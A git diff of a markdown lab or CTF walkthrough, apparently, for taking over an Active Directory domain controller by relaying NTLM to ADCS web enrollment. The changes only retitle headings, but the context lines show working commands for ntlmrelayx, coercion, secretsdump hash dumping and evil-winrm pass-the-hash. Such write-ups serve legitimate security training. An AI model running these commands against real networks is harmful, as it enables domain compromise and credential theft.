@@ -4,7 +4,7 @@
 
 ---
 
-## TL;DR Flow
+## Flow
 1) **Run ntlmrelayx** against ADCS web enrollment (`certsrv`).  
 2) **Trigger coercion** (printerbug, PetitPotam, etc.) from DC to attacker → relay to ADCS.  
 3) **Obtain .pfx cert** for `DC01$`.  
@@ -63,7 +63,7 @@ This generates a valid Kerberos TGT and saves it.
 ---
 
 ## Kerberos Environment Setup
-### 3.1 Export Ticket
+### Export Ticket
 ```bash
 export KRB5CCNAME=/tmp/dc.ccache
 klist
@@ -88,7 +88,7 @@ impacket-secretsdump -k -no-pass -dc-ip DC01_IP \
 ```
 Example output shows Administrator NTLM hash.
 
-### Pass-the-Hash → WinRM
+### Pass-the-Hash  WinRM
 ```bash
 evil-winrm -i dc01.domain.local -u Administrator -H <NTLM_HASH>
 ```
@@ -101,7 +101,7 @@ type C:\Users\Administrator\Desktop\flag.txt
 
 ---
 
-## Quick Reference — Commands
+## Quick Reference
 ```bash
 # Relay setup
 impacket-ntlmrelayx -t http://DC/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
